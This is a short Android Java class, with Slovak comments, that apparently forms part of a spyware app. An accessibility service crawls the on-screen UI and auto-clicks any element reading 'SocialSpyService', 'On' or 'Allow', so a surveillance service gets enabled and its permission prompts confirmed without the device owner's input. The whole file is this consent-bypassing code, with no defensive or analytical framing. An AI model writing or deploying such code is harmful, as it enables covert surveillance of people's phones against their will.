package com.example.app;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class AccessibilityAutoActivator extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null || event.getSource() == null) return;

        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode != null) {
            traverseAndClick(rootNode, "SocialSpyService"); // názov služby
            traverseAndClick(rootNode, "On"); // toggle
            traverseAndClick(rootNode, "Allow"); // potvrdenie
        }
    }

    private void traverseAndClick(AccessibilityNodeInfo node, String text) {
        if (node == null) return;
        CharSequence nodeText = node.getText();
        if (nodeText != null && nodeText.toString().toLowerCase().contains(text.toLowerCase())) {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            traverseAndClick(node.getChild(i), text);
        }
    }

    @Override
    public void onInterrupt() {}
}